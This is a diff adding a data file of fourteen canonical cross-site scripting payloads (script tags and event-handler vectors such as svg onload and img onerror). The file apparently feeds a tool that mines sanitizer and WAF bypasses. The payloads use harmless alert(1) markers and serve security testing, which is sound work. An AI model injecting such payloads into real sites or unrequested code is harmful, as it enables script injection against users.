@@ -1,0 +1,26 @@
+# Tier-B canonical executable XSS vectors, seeded into sanitizer bypass mining.
+#
+# Each `vector` is a concrete payload that EXECUTES in a markup sink (a live
+# <script>, a tag carrying an on* handler). Mining tests every vector against the
+# extracted sanitizer model and reports those that survive executable; the
+# L*/SFA learner then adds DEDUCED variants the model's boundary reveals. Extend
+# coverage by adding vectors here (Tier-B data) — never by hardcoding in code.
+#
+# `1` is the canonical alert marker (matches the rest of wafrift's corpus).
+
+vector = [
+    "<script>alert(1)</script>",
+    "<svg onload=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<img/src=x/onerror=alert(1)>",
+    "<body onload=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "<a onmouseover=alert(1)>x</a>",
+    "<iframe onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<video><source onerror=alert(1)>",
+    "<marquee onstart=alert(1)>",
+    "<select autofocus onfocus=alert(1)>",
+    "<math><mtext><script>alert(1)</script>",
+]
